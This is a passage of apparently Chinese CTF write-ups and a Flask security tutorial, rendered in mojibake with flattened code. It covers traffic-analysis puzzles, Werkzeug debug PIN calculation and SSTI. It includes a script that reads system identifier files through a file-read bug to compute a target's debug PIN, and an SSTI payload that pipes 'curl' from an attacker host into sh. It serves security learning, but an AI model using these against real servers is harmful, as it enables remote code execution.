çœ‹ï¼Œæ‡‚çš„éƒ½æ‡‚\n\nå‚æ•°å°±æ˜¯useräº†\nï¼ˆ2ï¼‰åˆè§base64\n\nï¼ˆ3ï¼‰è¿˜æ˜¯base64ï¼Œå¥½æ²¡åŠ²å•Š\n\n","tags":["wp","flow","Misc"]},{"title":"SkyMirror_WP_USBæµé‡åˆ†æ","url":"/2022/04/30/usb%20wireshark/","content":"(RoarCTF2019)davinci_cipher_æ•°ä½æ¿æµé‡åˆ†æè¿™æ˜¯æˆ‘ç›®å‰åšçš„æ¯”è¾ƒéš¾çš„ä¸€ä¸ªæµé‡åˆ†æï¼Œè¿™é¢˜å¹²æ‰°é¡¹è¶…çº§å¤šï¼Œä½†æ˜¯æ ¹æ®æç¤ºèƒ½çŸ¥é“æ˜¯ä¸ªusbæµé‡åˆ†æï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªæç¤ºï¼Œåšè¿™ä¸ªé¢˜ç»å¯¹æ˜¯è¶…çº§è‰°éš¾ï¼›é¢˜ç›®åœ¨è¿™å„¿\né¦–å…ˆflag.txtï¼šé€šè¿‡ç™¾åº¦ï¼Œå¯ä»¥å¾—å‡ºæ˜¯ä¸€ä¸²emojiçš„Unicodeçš„ç¼–ç ï¼Œå¯ä»¥æ¥è¿™é‡Œè§£ç ä¸€ä¸‹\nç„¶åç»è¿‡åˆæ­¥çš„æµé‡åˆ†æï¼ˆæˆ–è€…è¯´æ˜¯çœ‹æç¤ºï¼‰ï¼Œå¯ä»¥çœ‹å‡ºæœ‰ä¸€ä¸²éå¸¸å¯ç–‘çš„USBæµé‡tsharkåˆ†ç¦»ä¸€ä¸‹\n\ntshark -r k3y.pcapng -T fields -e usbhid.data &gt; usbdata.txt\n\nçœ‹åˆ«çš„å¤§ä½¬çš„åšå®¢ï¼Œå­¦åˆ°äº†ä¸€ç§å¤„ç†ç©ºç™½æ•°æ®çš„æ–¹æ³•\n\ntshark -r â€˜k3y.pcapngâ€™ -T fields -e usbhid.data |sed â€˜/^$/dâ€™ &gt; usbdata.txt\n\nå†çœ‹æµé‡ï¼Œçœ‹åˆ°äº†wacomæ˜¯ä¸€å—æ•°ä½æ¿\n\nwacomæ˜¯æœ‰å‹æ„Ÿçš„ç»˜å›¾æ¿ï¼Œè¯¦ç»†è¯´æ˜åœ¨USBåè®®æ–‡æ¡£é‡Œçš„Figure 19ï¼š\n\nä¸€èˆ¬éƒ½æ˜¯xåæ ‡2ä¸ªå­—èŠ‚ï¼ŒYåæ ‡ä¹Ÿæ˜¯2ä¸ªå­—èŠ‚ï¼Œåˆå› ä¸ºXï¼ŒYåæ ‡å‡ä»¥å°ç«¯æ–¹å¼å­˜å‚¨ï¼Œå› æ­¤ç”»å›¾åæ ‡ä¸ªä½æ•°å­—å˜åŒ–ä¼šå¤§ä¸€äº›ã€‚çŒœæµ‹åæ ‡å¦‚å›¾æ‰€ç¤ºï¼ˆæ·±ç´«Xï¼Œæµ…è“Yï¼Œçº¢è‰²å‹æ„Ÿï¼‰ã€‚\n\nå¼€å§‹å¤„ç†ä¸€ä¸‹æœ‰ç”¨æ•°æ®\na = open(&quot;coor.txt&quot;,&#x27;a+&#x27;)for line in open(&quot;usbdata.txt&quot;,&#x27;r&#x27;):    if(len(line)==55):        a.write(line)#æŠŠæ²¡å¿…è¦çš„æ•°æ®è¿‡æ»¤æ‰ï¼Œä¾æ®é•¿åº¦a.close()\n\nå‰ƒæ‰å‹æ„Ÿä¸º0çš„æ•°æ®ï¼ŒæŠŠåæ ‡æå–å‡ºæ¥è¿˜åŸæˆ10è¿›åˆ¶ã€‚\na = open(&quot;finish.txt&quot;,&#x27;a+&#x27;)x1 = []y1 = []x2 = []y2 = []for line in open(&quot;coor.txt&quot;,&#x27;r&#x27;):    if(line[16:18]!=&quot;00&quot;):        x1.append(line[4:8])        y1.append(line[10:14])#ç­›é€‰å¿…è¦çš„åæ ‡æ•°æ®for i in x1:    x2.append(int(i[2:4]+i[0:2],16))for j in y1:    y2.append(int(j[2:4]+j[0:2],16))#æŠŠåå…­è¿›åˆ¶åæ ‡è½¬ä¸ºåè¿›åˆ¶for z in range(len(x2)):#æ ¹æ® ä¸€èˆ¬éƒ½æ˜¯xåæ ‡2ä¸ªå­—èŠ‚ï¼ŒYåæ ‡ä¹Ÿæ˜¯2ä¸ªå­—èŠ‚ å†åˆ¤æ–­ä¸€ä¸‹    a.write(str(x2[z])+&quot; &quot;+str(y2[z])+&#x27;\\n&#x27;)\n\nç„¶åæ”¾åˆ°gnuplot\n\nplot â€œfinish.txtâ€\n\n\nåè½¬ä¸€ä¸‹å¾—åˆ°\n\nMONA_LISA_IS_A_MAN\n\nç”¨ç¬¬ä¸€æ­¥flag.txté‡Œçš„emojiä½œä¸ºå¯†æ–‡ï¼Œä¸Šæ­¥å¾—å‡ºçš„å­—ç¬¦ä¸²ä½œä¸ºå¯†é’¥ï¼Œemojiè§£å¯†ï¼Œå¾—åˆ°flagã€‚\n","tags":["python","wp","SkyMirror","USB_flow"]},{"title":"ï¼ˆ2022ç¬¬äºŒå±Šç½‘åˆƒæ¯ï¼‰ ISC","url":"/2022/04/29/wangren2022ics/","content":"ncsubjè¿™é¢˜ä¸»è¦è€ƒç‚¹æ˜¯ç¼–ç æ–¹é¢ï¼Œæ‰“å¼€ï¼Œè¿½è¸ªæµä¸€ä¸‹ï¼Œå‘ç°å¥‡å¥‡æ€ªæ€ªç¼–ç \n\n\nä¸‰æ®µï¼Œé•¿å¾—å¾ˆåƒbase64ï¼Œè§£ç çœ‹çœ‹\n\næœç„¶ï¼Œæ²¡æœ‰æƒ³è±¡çš„é‚£ä¹ˆç®€å•ï¼Œç»§ç»­è§£ç \n\nwhatancsubjectå¾ˆåƒï¼Œè¿˜çœŸæ˜¯\nå–œæ¬¢ç§»åŠ¨çš„é»‘å®¢æ¯”èµ›æ—¶å€™ï¼Œæ­£å¸¸å¼€ï¼Œæ‰“ä¸å¼€ï¼Œåˆ†äº†ä¸€ä¸‹ï¼Œå‡ºæ¥äº†ä¸ªå‹ç¼©åŒ…ï¼Œå°±ä»¥ä¸ºæ˜¯å‹ç¼©åŒ…ï¼Œç„¶åæ€è·¯èµ°åäº†ã€‚\nä¹‹å‰ä»æ¥æ²¡æœ‰æ¥è§¦è¿‡æµé‡çš„æ–‡ä»¶å¤´ï¼Œä¹Ÿæ²¡çœ‹å‡ºæ¥ï¼Œè¿™æ¬¡æ¶¨å§¿åŠ¿äº†ã€‚\næŠŠé¢˜ç›®ä¸­çš„pcapangå’Œæ­£å¸¸çš„pcapangæ”¾ä¸€èµ·ï¼Œä¼šå¾ˆæ˜æ˜¾å‘ç°æ–‡ä»¶å¤´ä¸ä¸€æ ·ï¼Œå¤´å››ä½å‰é¢æ”¹æˆ 0A0D0D0A ï¼Œå°±èƒ½æ­£å¸¸æ‰“å¼€\nç»§ç»­çœ‹ï¼Œç»“åˆæè®®ï¼Œç­›é€‰å‡ºmodbusï¼Œæµé‡ä¸­çš„æ•°æ®ä¸€èˆ¬æ˜¯HEXï¼Œæ‰€ä»¥ç®—ä¸€ä¸‹10000çš„HEX = 2710\nç»§ç»­ç¿»æ‰¾ï¼Œå‘ç°å¼‚å¸¸\n\nè½¬å›10è¿›åˆ¶ï¼Œ10086ï¼Œæ‹¼æ¥68156\nå¾—åˆ°flag\nxyp07è¿™é¢˜æ¨èä¸€æ¬¾å·¥å…·ç§‘æ¥ç½‘ç»œåˆ†æç³»ç»Ÿå®˜ç½‘æ˜¯èƒ½ä¸‹åˆ°çš„\nä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯å·§åˆï¼Œæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡ç”¨è¿™æ¬¾å·¥å…·ï¼Œ\nå’±ä»¬ç›´æ¥æ‰“å¼€ï¼ŒæŠŠæµé‡åŒ…ä¸€æ‰”ï¼Œå®ƒå°±è¯Šæ–­å‡ºæ¥äº†\n\næ‰“å¼€ä¸€ç¿»ï¼Œå‡ºç°å¥‡æ€ªä¸œè¥¿\n\nè§£ç ï¼Œbase91\n\n\ncryptolaliaé¢˜ç›®åœ¨è¿™å„¿\né¢˜ç›®é™„ä»¶ä¸ºä¸€å¼ å›¾ç‰‡ï¼Œç›´æ¥ä¿®æ”¹åç¼€ï¼Œèƒ½å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…æ³¨é‡Šä¸€æ¡é±¼ï¼Œå¹¶ä¸”æ”¾å‡ºhintï¼šé±¼å¾ˆé‡è¦\næš‚æ—¶ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ï¼Œç»§ç»­çœ‹\nåˆæœ‰hintï¼Œèƒ½çˆ†ç ´ï¼Œæœç„¶çˆ†ç ´å‡ºæ±¡æ³¥è„±æ°´é—´æ•°æ®è¯¦æƒ…çš„å¯†ç \n\n\næ‰“å¼€æµé‡ï¼Œæ‡µé€¼äº†ï¼ŒçŒœæµ‹è¢«åŠ å¯†è¿‡ï¼Œè¿½è¸ªTCPæµå‘ç°\n\nå‘ç°ä¼¼ä¹å¯†æ–‡U2FsdGVkX19pczQKWsMcjgrJt8f09dSN\næ¥åˆ°è¿™é‡Œï¼Œè”æƒ³fish\nè§£ç å¾—åˆ°\nå¾—åˆ°è®¾å¤‡è¯å‰‚é—´æ•°æ®è¯¦æƒ…å‹ç¼©åŒ…å¯†ç ï¼Œè§£å‹ååˆä¸€å‹ç¼©åŒ…å’Œtxtï¼Œtxtæœ€åè¯´å¹´è½»äººï¼Œæœ‰æ—¶å€™çœ¼è§ä¸ä¸€å®šä¸ºå®ï¼\nä»€ä¹ˆæ„æ€ï¼Œè«éæ˜¯ä¼ªåŠ å¯†ï¼Œå¥½å®¶ä¼™ï¼Œä¸€ä¿®å¤å°±å¥½äº†\nè§£å‹åˆå¾—åˆ°ä¸€æµé‡\næ— è„‘è¿½è¸ªæµï¼Œ0æµå°±å‘ç°å¼‚å¸¸\n\næŠŠå›¾ç‰‡å¯¼å‡ºæ¥ï¼Œä¿®æ”¹é«˜åº¦å°±èƒ½å¾—åˆ°\n\nLED_BOOMè¿™é¢˜ä¸éš¾ï¼Œè®¤çœŸè¯»é¢˜å¾ˆé‡è¦ï¼Œæå®‰å…¨ä¸€å®šè¦å¯¹ä¸€åˆ‡ä¿¡æ¯å¾ˆæ•æ„Ÿ\nè¿™é¢˜å½“æ—¶æ²¡æœ‰è®¤çœŸè¯»é¢˜ï¼Œæ‰€ä»¥æ²¡æœ‰åšå‡ºæ¥\nå…ˆçœ‹é¢˜ï¼Œé¢˜ç›®åœ¨è¿™å„¿\n\né›ªæ®‡ç›´æ¥ä¸€çœ¼é¡¶é’ˆAESï¼Œæˆ‘æ˜¯ä¸€çœ¼çœ‹ä¸å‡ºæ¥ï¼Œå¾—çŒœ\n\né¢˜å¹²åœ¨è¿™é‡Œï¼Œå¼ºè°ƒä¸‰æ¬¡ç­›é€‰ä¸€ä¸‹s7commï¼ŒæŒ‰ç…§é•¿åº¦ï¼Œä¼šå‘ç°æœ‰ä¸‰ä¸ªlengthç›¸åŒçš„åŒ…ï¼Œç»†çœ‹å‘ç°äº†LED:On ï¼ŒOff\n\nå¾—åˆ°585692787\nç»“åˆå›¾ç‰‡ä¸­çš„å¯†æ–‡ï¼ŒU2FsdGVkX19cOOV8qLVgcso8U4fse+7LirQKiHFkn9HU9BuwFAivH1siJXg/Rk6zè§£ç§˜ä¸€ä¸‹\nåœ¨è¿™é‡Œè§£ç å¾—åˆ°\n\n","tags":["wp","flow","SkyMirror","ISC"]},{"title":"web10_pyweb+flaskssti+ååºåˆ—åŒ–","url":"/2023/04/23/web10-pyweb-flaskssti-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"Flaskå­¦ä¹ æåˆ°pythonå°±ç¦»ä¸å¼€flask, è¿™é‡Œæˆ‘ä»¬å…ˆå€Ÿç”¨flaskå†™ä¸€ä¸ªhelloworld\né¦–å…ˆç›´æ¥pip install flask\nfrom flask import Flaskapp = Flask(__name__)@app.route(&quot;/&quot;) #è¡¨ç¤ºé¦–é¡µç›®å½•def hello():    return &quot;helloworld&quot;if __name__ == &quot;__main__&quot;:    app.run()\n\n\nè¿™é‡Œæ˜¯5000ç«¯å£, ä¿®æ”¹ç«¯å£ä¹Ÿæ˜¯å¾ˆç®€å•, ç›´æ¥åœ¨run()é‡ŒåŠ port=å³å¯\n\nè¿™é‡Œå†ä»‹ç»ä¸¤ä¸ªå‚æ•°hostå’Œdebug\nfrom flask import Flaskfrom flask import requestapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    return &quot;helloworld&quot;@app.route(&quot;/hello&quot;,methods=[&#x27;POST&#x27;])def hello():    username = request.form[&#x27;username&#x27;]    passwd = request.form[&#x27;passwd&#x27;]    result = check(username,passwd)    if result:        return &#x27;welcome login&#x27;    else:        return &#x27;error&#x27;def check(username,passwd):    return username==&#x27;admin&#x27; and passwd==123456if __name__ == &quot;__main__&quot;:    app.run(host=&quot;0.0.0.0&quot;,port=80,debug=True)\n\næ·»åŠ host=&quot;0.0.0.0&quot;, æˆ‘ä»¬çš„ç½‘ç«™å°±å¯ä»¥è®©å…¶ä»–IPé€šè¿‡http://10.187.81.36/åœ°å€è®¿é—®\n\nç„¶å, å¦‚æœæˆ‘ä»¬è¿™é‡Œæ•…æ„å†™é”™ä¸€ä¸‹, å°±ä¼šå‡ºç°debugå†…å®¹\nFlask PINç è®¡ç®—debugå¼€å¯äº†å°±ä¼šå­˜åœ¨ä¸€ä¸ªæ¼æ´, è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°, å¼€å¯debugå, ä¼šè¿”å›ä¸€ä¸ªPINç \nè¿™é‡Œæˆ‘ä»¬è®¿é—®ä¸€ä¸‹http://10.187.81.36/consoleå°±ä¼šå¼¹å‡ºä¸€ä¸ªè®©æˆ‘ä»¬å¡«pinç çš„æ¡†, åªè¦æ­£ç¡®è¾“å…¥pinç , æˆ‘ä»¬å°±å¯ä»¥å®ç°è¿œç¨‹ä»»æ„å‘½ä»¤æ‰§è¡Œ, æ¯”å¦‚è¿™é‡Œæˆ‘ä»¬æŠŠäº‹å…ˆçŸ¥é“çš„pinç è¾“å…¥è¿›å»\nå°±åˆ°äº†ä¸€ä¸ªpythonç¯å¢ƒ, æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡osæ‰§è¡Œç³»ç»Ÿå‘½ä»¤\nimport osos.system(&#x27;calc&#x27;)\n\n\nç„¶è€Œè¿™ä¸ªpinç åˆæ˜¯å¯ä»¥é€šè¿‡è®¡ç®—å¾—å‡ºçš„\nè¿™é‡Œæˆ‘ä»¬çœ‹ä¸€ä¸‹pythonæºç , æ‰¾ä¸€ä¸‹pinç æ˜¯å¦‚ä½•è®¡ç®—å¾—å‡ºçš„, æºç è·¯å¾„Python\\Lib\\site-packages\\werkzeug\\debug\\__init__.py\n\nåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°pinçš„è®¡ç®—é€»è¾‘\nè¿™é‡Œçš„è¿™ä¸ªuuid.getnode()å¯ä»¥é€šè¿‡æœ¬åœ°æ‰§è¡Œå¾—åˆ°\n\nè¿™é‡Œæˆ‘ä»¬å¤šæ¬¡æ‰§è¡Œå¯ä»¥å‘ç°, å€¼æ˜¯ä¸å˜çš„, è¯´æ˜æ˜¯ä¸æˆ‘ä»¬æœºå™¨æœ‰å…³çš„å›ºå®šå€¼\nç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹machine_idçš„è®¡ç®—é€»è¾‘\n#æ‘˜è‡ªPython\\Lib\\site-packages\\werkzeug\\debug\\__init__.pydef get_machine_id() -&gt; t.Optional[t.Union[str, bytes]]:    global _machine_id    if _machine_id is not None:        return _machine_id    def _generate() -&gt; t.Optional[t.Union[str, bytes]]:        linux = b&quot;&quot;        # machine-id is stable across boots, boot_id is not.        for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;:            try:                with open(filename, &quot;rb&quot;) as f:                    value = f.readline().strip()            except OSError:                continue            if value:                linux += value                break        # Containers share the same machine id, add some cgroup        # information. This is used outside containers too but should be        # relatively stable across boots.        try:            with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f:                linux += f.readline().strip().rpartition(b&quot;/&quot;)[2]        except OSError:            pass        if linux:            return linux        # On OS X, use ioreg to get the computer&#x27;s serial number.        try:            # subprocess may not be available, e.g. Google App Engine            # https://github.com/pallets/werkzeug/issues/925            from subprocess import Popen, PIPE            dump = Popen(                [&quot;ioreg&quot;, &quot;-c&quot;, &quot;IOPlatformExpertDevice&quot;, &quot;-d&quot;, &quot;2&quot;], stdout=PIPE            ).communicate()[0]            match = re.search(b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;, dump)            if match is not None:                return match.group(1)        except (OSError, ImportError):            pass        # On Windows, use winreg to get the machine guid.        if sys.platform == &quot;win32&quot;:            import winreg            try:                with winreg.OpenKey(                    winreg.HKEY_LOCAL_MACHINE,                    &quot;SOFTWARE\\\\Microsoft\\\\Cryptography&quot;,                    0,                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,                ) as rk:                    guid: t.Union[str, bytes]                    guid_type: int                    guid, guid_type = winreg.QueryValueEx(rk, &quot;MachineGuid&quot;)                    if guid_type == winreg.REG_SZ:                        return guid.encode(&quot;utf-8&quot;)                    return guid            except OSError:                pass        return None    _machine_id = _generate()    return _machine_id\n\nè¿™é‡Œç»™å‡ºäº†Linux,MacOså’ŒWindowsä¸‰ä¸ªç³»ç»Ÿçš„è·å–æ–¹æ³•, æˆ‘ä»¬è¿™é‡Œå…ˆæ¥çœ‹ä¸€ä¸‹Windowsç³»ç»Ÿçš„\næˆ‘ä»¬win+rè¾“å…¥regeditç„¶ååœ¨è·¯å¾„é‡Œæ‰“å¼€è®¡ç®—æœº\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptographyå°±èƒ½çœ‹åˆ°machine_idå°±æ˜¯å›¾ä¸­æˆ‘æ‰“ç çš„éƒ¨åˆ†\nç„¶åæˆ‘ä»¬æ ¹æ®pinç è®¡ç®—é€»è¾‘, è‡ªå·±è®¡ç®—ä¸€ä¸‹æœ¬æœºçš„pinç \nimport hashlibfrom itertools import chainusername = &quot;Charmersix&quot;modname=&quot;flask.app&quot;appname=&quot;Flask&quot;moddir=&quot;E:\\\\Python\\\\lib\\\\site-packages\\\\flask\\\\app.py&quot;num=Nonerv=Noneprobably_public_bits = [        username,        modname,        appname,        moddir,    ]private_bits = [&quot;35315514738897&quot;, &quot;a*******-****-****-****-c**********6&quot;]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode(&quot;utf-8&quot;)    h.update(bit)h.update(b&quot;cookiesalt&quot;)if num is None:    h.update(b&quot;pinsalt&quot;)    num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]if rv is None:        for group_size in 5, 4, 3:            if len(num) % group_size == 0:                rv = &quot;-&quot;.join(                    num[x : x + group_size].rjust(group_size, &quot;0&quot;)                    for x in range(0, len(num), group_size)                )                break        else:            rv = numprint(rv)\n\nå¯ä»¥å‘ç°ç»“æœä¸ä¹‹å‰ä¸€æ ·\nLinuxä¸‹å½“ç„¶ä¹Ÿæ˜¯å¯ä»¥è®¡ç®—å¾—å‡ºçš„, å…·ä½“åŒºåˆ«å°±æ˜¯Linuxä¸‹éœ€è¦æ‹¿çš„æ–‡ä»¶ä¸ä¸€æ ·\ndef _generate() -&gt; t.Optional[t.Union[str, bytes]]:       linux = b&quot;&quot;       # machine-id is stable across boots, boot_id is not.       for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;:           try:               with open(filename, &quot;rb&quot;) as f:                   value = f.readline().strip()           except OSError:               continue           if value:               linux += value               break       # Containers share the same machine id, add some cgroup       # information. This is used outside containers too but should be       # relatively stable across boots.       try:           with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f:               linux += f.readline().strip().rpartition(b&quot;/&quot;)[2]       except OSError:           pass       if linux:           return linux\n\nLinuxä¸‹å°±éœ€è¦è¯»/etc/machine-idå’Œ/proc/sys/kernel/random/boot_idå’Œ/proc/self/cgroupä¸‰ä¸ªæ–‡ä»¶\nè¿™é‡Œæ„Ÿè°¢ctfshowçš„å¤§å¸ˆå‚…æä¾›äº†ä¸€ä¸ªä¸€æŠŠæ¢­çš„è„šæœ¬\n#å¯¼å…¥éœ€è¦çš„åŒ…import hashlibfrom itertools import chainimport requestsurl = &quot;http://9ab6f69b-79a0-471c-bf92-9e4fb9df9a98.challenges.ctfer.com:8080/file?filename=&quot;#é¢˜ç›®åœ°å€username = &quot;root&quot;path=&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;#è·¯å¾„:æŠ¥é”™å¯å¾—def get_uuid():    payload = &quot;/sys/class/net/eth0/address&quot;    response = requests.get(url=url+payload)    if response.status_code ==200:        print(&quot;uuid is &#123;&#125; &quot;.format(int(response.text.strip().replace(&quot;:&quot;,&quot;&quot;)[1:],16)))        return str(int(response.text.strip().replace(&quot;:&quot;,&quot;&quot;)[1:],16))    else:        return &quot;&quot;def get_mechine_id():    payload = &quot;/etc/machine-id&quot;    response = requests.get(url=url+payload)    if response.status_code ==200:        print(&quot;machine-id is &#123;&#125; &quot;.format(pin))        return response.text.strip()    else:        return &quot;&quot;def get_boot_id():    payload = &quot;/proc/sys/kernel/random/boot_id&quot;    response = requests.get(url=url+payload)    if response.status_code ==200:        print(&quot;boot_id is &#123;&#125; &quot;.format(response.text.strip()))        return response.text.strip()    else:        return &quot;&quot;def get_cgroup():    payload = &quot;/proc/self/cgroup&quot;    response = requests.get(url=url+payload)    if response.status_code ==200:        print(&quot;cgroup is &#123;&#125; &quot;.format(str(response.text.strip().rpartition(&quot;/&quot;)[2])))        return response.text.strip().rpartition(&quot;/&quot;)[2]    else:        return &quot;&quot;def get_PIN():    rv = None    num = None    probably_public_bits = [        username,# /etc/passwd        &#x27;flask.app&#x27;,# é»˜è®¤å€¼        &#x27;Flask&#x27;,# é»˜è®¤å€¼        path # æŠ¥é”™å¾—åˆ°    ]            private_bits = [get_uuid(), get_mechine_id()+get_boot_id()+get_cgroup()]    print(&quot;private_bits is &quot;)    print(private_bits)      #å¤åˆ¶ç®—æ³•é€»è¾‘      h = hashlib.sha1()    for bit in chain(probably_public_bits, private_bits):        if not bit:            continue        if isinstance(bit, str):            bit = bit.encode(&quot;utf-8&quot;)        h.update(bit)    h.update(b&quot;cookiesalt&quot;)    cookie_name = f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;    # If we need to generate a pin we salt it a bit more so that we don&#x27;t    # end up with the same value and generate out 9 digits    if num is None:        h.update(b&quot;pinsalt&quot;)        num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]    # Format the pincode in groups of digits for easier remembering if    # we don&#x27;t have a result yet.    if rv is None:        for group_size in 5, 4, 3:            if len(num) % group_size == 0:                rv = &quot;-&quot;.join(                    num[x : x + group_size].rjust(group_size, &quot;0&quot;)                    for x in range(0, len(num), group_size)                )                break        else:            rv = num    return rvif __name__ == &#x27;__main__&#x27;:        pin = get_PIN()        print(&quot;PIN is &#123;&#125; &quot;.format(pin))\n\nåŸºäºFlaskä¸‹çš„SSTIsstiå…¨ç§°ä¸ºæ¨¡æ¿æ³¨å…¥, ä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¦æ¸²æŸ“çš„æ¨¡æ¿çš„æ—¶å€™, ä¹Ÿå°±æ˜¯å¯ä»¥æ§åˆ¶æ¨¡æ¿ä¸­çš„å˜é‡æ ‡è®°å†…å®¹, è¿™æ—¶å€™, æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¨¡æ¿è¯­æ³•, æ‰§è¡Œpythonä»£ç , å®ç°ä»»æ„ä»£ç æ‰§è¡Œ\npythoné­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»åœ¨å­¦ä¹ sstiæ³¨å…¥ä¹‹å‰, æˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€äº›pythonçš„é­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»\nclass__class__ç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»\nğŸŒ°\nbase__base__ç”¨äºè·å–ç±»çš„åŸºç±»(ä¹Ÿç§°çˆ¶ç±»)\nğŸŒ°\nmro__mro__è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåº, (å½“è°ƒç”¨__mro__[1]æˆ–è€…-1æ—¶ä½œç”¨å…¶å®ç­‰åŒäº__base__)ç¤ºä¾‹:\nğŸŒ°\n\nsubclasses()__subclasses__()å¯ä»¥è·å–ç±»çš„æ‰€æœ‰å­ç±»\nğŸŒ°\nç›®å‰ä¸»è¦åˆ†ä¸¤ç§æƒ…å†µä¸‹çš„æ¨¡æ¿æ³¨å…¥\næ¨¡æ¿åç§°å¯æ§ç±»ä¼¼äºä¸Šé¢å­¦åˆ°çš„å†…å®¹, å½“login.htmlè¿™ä¸ªå‚æ•°å¯ä»¥æ§åˆ¶çš„æ—¶å€™, æˆ‘ä»¬å°±èƒ½æ¸²æŸ“æˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶\nfrom flask import Flaskfrom flask import requestfrom flask import  render_templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    return &#x27;plz login&#x27;@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])def login():    return render_template(&quot;login.html&quot;, username=request.form[&#x27;username&#x27;],passwd=request.form[&#x27;passwd&#x27;])if __name__ == &#x27;__main__&#x27;:    app.run(host=&quot;0.0.0.0&quot;,port=80,debug=True)\n\n\n\n\nrender_template æ˜¯flaskä¸­é¡µé¢è·³è½¬çš„æ–¹æ³•ï¼Œå…¶ç”¨æ³•å¾ˆç®€å•ï¼Œå¦‚ä¸‹ï¼š\nreturn render_template(&quot;index.html&quot;)\n\nè¿™ç§æ–¹æ³•å¯ä»¥ä¼ é€’å‚æ•°ï¼Œå…·ä½“æ–¹æ³•å¦‚ä¸‹ï¼š\nreturn render_template(&quot;index.html&quot;, msg=session.get(&quot;username&quot;))\n\nè¿™æ—¶å¯ä»¥å°†ä½ æƒ³è¦ä¼ é€’çš„æ•°æ®ä¼ é€’åˆ°ä½ è¦è·³è½¬çš„é¡µé¢ï¼Œåœ¨é¡µé¢ä¸­æ˜¾ç¤ºè¿™äº›å†…å®¹éœ€è¦ä½¿ç”¨ï¼š\n&#123;&#123;msg&#125;&#125;\n\nè¿™é‡Œçš„login.htmlå¯æ§, è¿™æ—¶å€™éœ€è¦ä¸€ä¸ªä¸Šä¼ ç‚¹, ä¸Šä¼ åŒ…å«æ¨¡æ¿è¯­æ³•çš„htmlè¢«æ¸²æŸ“å°±å¯ä»¥æ¸²æŸ“æ‰§è¡Œæˆ‘ä»¬çš„pythonä»£ç \næ¨¡æ¿å†…å®¹å¯æ§å¦‚æœè¦å®ç°æ¨¡æ¿å†…å®¹å¯æ§å°±éœ€è¦ä½¿ç”¨åˆ°å±é™©å‡½æ•°, ä¾‹å¦‚è¿™é‡Œä½¿ç”¨ä¸€ä¸ªrender_template_string()\nfrom flask import Flask, render_template_stringfrom flask import requestapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    return &#x27;plz login&#x27;@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])def login():    return render_template_string(request.form[&#x27;content&#x27;])if __name__ == &#x27;__main__&#x27;:    app.run(host=&quot;0.0.0.0&quot;,port=80,debug=True)\n\nè¿™é‡Œå¯ä»¥æˆåŠŸæ‰§è¡Œæ ‡ç­¾å†…çš„è¡¨è¾¾å¼\n\nè¿™é‡Œä»‹ç»ä¸€ä¸ªæœ€ç®€å•çš„payloadname=&#123;&#123;\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('curl https://your-shell.com/ip:port |sh')&#125;&#125;\nè¿™é‡Œå¯ä»¥é€šè¿‡åå¼¹shellæ‹¿åˆ°flag\nåšé¢˜æ€è·¯è¿™é‡Œå¤§è‡´å†™ä¸€ä¸‹åšé¢˜æ­¥éª¤\nåœ¨pythonä¸­, æ˜¯é€šè¿‡ç±»åæ–¹æ³•åçš„æ–¹å¼è°ƒç”¨çš„, å¦‚æœæˆ‘ä»¬è¦è°ƒç”¨shellå‘½ä»¤, ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥ä½¿ç”¨os.system(&#39;calc&#39;), é‚£ä¹ˆå¦‚ä½•åœ¨è¡¨è¾¾å¼æ ‡ç­¾ä¸­, æ‰¾åˆ°osç±»å‘¢\nç¬¬ä¸€æ­¥ æ‹¿åˆ°å½“å‰ç±»\nä¹Ÿå°±æ˜¯é€šè¿‡ç±»å‹æ‹¿åˆ°__class__\nè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨&#123;&#123;\"\".__class__&#125;&#125;\nç¬¬äºŒæ­¥ æ‹¿åˆ°å½“å‰ç±»çš„åŸºç±»\nè¿™æ—¶å€™, æˆ‘ä»¬å¯ä»¥å†™ä¸º\n\n&#123;&#123;\"\".__class__.__base__&#125;&#125;\n&#123;&#123;\"\".__class__.__base[0]__&#125;&#125;\n&#123;&#123;\"\".__class__.__mro__[1]&#125;&#125;\n\nç¬¬ä¸‰æ­¥ 